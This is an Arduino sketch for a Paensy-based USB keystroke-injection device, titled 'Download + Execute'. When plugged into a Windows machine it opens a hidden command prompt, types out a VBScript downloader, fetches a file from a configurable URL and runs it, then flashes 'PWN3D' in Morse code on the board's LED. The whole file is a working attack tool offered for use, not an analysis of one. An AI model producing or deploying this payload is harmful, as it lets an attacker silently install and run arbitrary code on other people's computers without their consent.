/***
 *    ______                    _                 _           _____                    _       
 *    |  _  \                  | |               | |    _    |  ___|                  | |      
 *    | | | |_____      ___ __ | | ___   __ _  __| |  _| |_  | |____  _____  ___ _   _| |_ ___ 
 *    | | | / _ \ \ /\ / / '_ \| |/ _ \ / _` |/ _` | |_   _| |  __\ \/ / _ \/ __| | | | __/ _ \
 *    | |/ / (_) \ V  V /| | | | | (_) | (_| | (_| |   |_|   | |___>  <  __/ (__| |_| | ||  __/
 *    |___/ \___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|         \____/_/\_\___|\___|\__,_|\__\___|
 *                                                                                             
 *                                                                                             
 *     _             _____                                                                     
 *    | |           |  _  |                                                                    
 *    | |__  _   _  | | | |_____   _ _ __ _   _                                                
 *    | '_ \| | | | | | | |_  / | | | '__| | | |                                               
 *    | |_) | |_| | \ \_/ // /| |_| | |  | |_| |                                               
 *    |_.__/ \__, |  \___//___|\__,_|_|   \__,_|                                               
 *            __/ |                                                                            
 *           |___/                                                                             
 */

#include <paensy.h>

void setup() {
  
  String fileName = "CONFIGURE ME (example: program.exe)", fileLink = "CONFIGURE ME (example: http://www.google.com/program.exe";
  
  // Configure the delay that everything else scales off of.
  SetDelay(500);
  // Configure the delay that the Morse code uses.
  SetMorseDelay(250);
  
  // Perform an initial delay to give the USB time to prepare.
  PerformInitDelay();
  
  // LED pin number, 13 for 3.1
  // 11 for 2 and 2.x
  SetLEDPin(13);
  
  // Put the pin into output mode
  pinMode(LED_PIN, OUTPUT);
  
  // Turn on the LED pin so we know the device is running.
  digitalWrite(LED_PIN, HIGH);
  
  delay(1000);
  
  // Open up the command prompt in a hidden fashion.
  RunCommand("cmd /Q /D /T:7F /F:OFF /V:ON /K");
  
  delay(500);
  
  // Delete the script if it exists.
  TypeLn("del download.vbs");
  
  // Start recording what's typed.
  TypeLn("copy con download.vbs");
  
  // Start typing the download script.
  TypeLn("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
  
  TypeLn("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
  
  TypeLn("If objXMLHTTP.Status = 200 Then");
  
  TypeLn("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
  
  TypeLn("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
  
  TypeLn("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
  
  TypeLn("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing ");
  
  TypeLn("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
  
  // Save the screen contents.
  Ctrl(KEY_Z);
  
  PressKey(KEY_ENTER, 1);
  
  // Download our file using our script.
  TypeLn("cscript download.vbs " + fileLink);
  
  // Execute the file and then exit.
  TypeLn(fileName + " && exit");
    
}

void loop() {
 // Celebratory LED fluttering.
 LED_Flutter(200, 10);
 
 // P
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 LED_MorseDot();
 
 // W
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 
 // N
 LED_MorseDash();
 LED_MorseDot();

 // 3
 LED_MorseDot();
 LED_MorseDot();
 LED_MorseDot();
 LED_MorseDash();
 LED_MorseDash();
 
 // D
 LED_MorseDash();
 LED_MorseDot();
 LED_MorseDot();
 
 // Flutter again.
 LED_Flutter(200, 10); 
}